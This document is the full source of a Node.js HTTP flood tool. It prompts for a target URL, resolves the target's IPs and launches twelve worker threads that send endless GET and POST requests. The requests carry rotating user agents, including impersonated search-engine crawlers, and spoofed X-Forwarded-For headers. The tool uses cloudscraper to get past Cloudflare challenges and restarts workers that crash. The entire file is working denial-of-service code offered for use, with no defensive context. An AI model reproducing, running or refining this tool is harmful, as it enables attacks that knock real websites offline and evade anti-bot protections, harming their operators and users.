const readline = require('readline');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const cloudscraper = require('cloudscraper');
const axios = require('axios');
const dns = require('dns');
const crypto = require('crypto');
const os = require('os');

// Config
const NUM_WORKERS = 12; // Match CPU cores
const MAX_REQUESTS_PER_WORKER = 5000; // Per worker
const REQUEST_TIMEOUT = 5000; // 5s timeout
const RETRY_DELAY = 100; // 100ms retry delay

// 20+ User Agents (desktop/mobile/bot)
const USER_AGENTS = [
    // Desktop
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0',
    // Mobile
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Android 14; Mobile; rv:109.0) Gecko/118.0 Firefox/118.0',
    // Bots (legit-looking)
    'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
    'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)',
    // Legacy
    'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
    // Random variants (Chrome/Firefox/Safari versions)
    ...Array.from({ length: 12 }, (_, i) => 
        `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${118 + i}.0.0.0 Safari/537.36`
    ),
];

// Randomizers
const randomUserAgent = () => USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
const randomIP = () => `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
const randomData = () => ({
    [crypto.randomBytes(4).toString('hex')]: crypto.randomBytes(8).toString('hex'),
});

// DNS Load Balancer
async function resolveIPs(hostname) {
    return new Promise((resolve) => {
        dns.resolve4(hostname, (err, addresses) => {
            resolve(err ? [hostname] : addresses); // Fallback to original if DNS fails
        });
    });
}

// Attack worker
async function attack(url, targetIPs) {
    const target = targetIPs[Math.floor(Math.random() * targetIPs.length)]; // Random IP
    const headers = {
        'User-Agent': randomUserAgent(),
        'X-Forwarded-For': randomIP(),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'keep-alive',
    };

    try {
        const options = {
            url: url.replace(/(https?:\/\/)[^\/]+/, `$1${target}`), // Replace host with IP
            headers,
            timeout: REQUEST_TIMEOUT,
            challengesToSolve: 3,
        };

        if (Math.random() > 0.5) {
            await cloudscraper.get(options);
            console.log(`[HIT][GET] ${target}`);
        } else {
            await cloudscraper.post({ ...options, formData: randomData() });
            console.log(`[HIT][POST] ${target}`);
        }
    } catch (error) {
        console.error(`[MISS][${target}] ${error.message}`);
        await new Promise(resolve => setTimeout(resolve, RETRY_DELAY)); // Delay before retry
    }
}

// Worker thread
if (!isMainThread) {
    const { url, targetIPs } = workerData;
    let active = true;

    const workerLoop = async () => {
        while (active) {
            await attack(url, targetIPs);
        }
    };

    workerLoop();
    parentPort?.on('message', (msg) => active = msg === 'stop');
}

// Main thread
if (isMainThread) {
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout,
    });

    rl.question('Enter target URL (e.g., https://example.com): ', async (url) => {
        rl.close();
        const hostname = url.replace(/https?:\/\/([^\/]+).*/, '$1');
        const targetIPs = await resolveIPs(hostname);
        console.log(`?? Targeting IPs: ${targetIPs.join(', ')}`);

        console.log(`?? Launching ${NUM_WORKERS} workers...`);
        const workers = Array.from({ length: NUM_WORKERS }, () => 
            new Worker(__filename, { workerData: { url, targetIPs } })
        );

        // Auto-restart failed workers
        workers.forEach(worker => {
            worker.on('error', () => {
                console.log('[!] Worker crashed. Restarting...');
                workers.push(new Worker(__filename, { workerData: { url, targetIPs } }));
            });
        });
    });
}
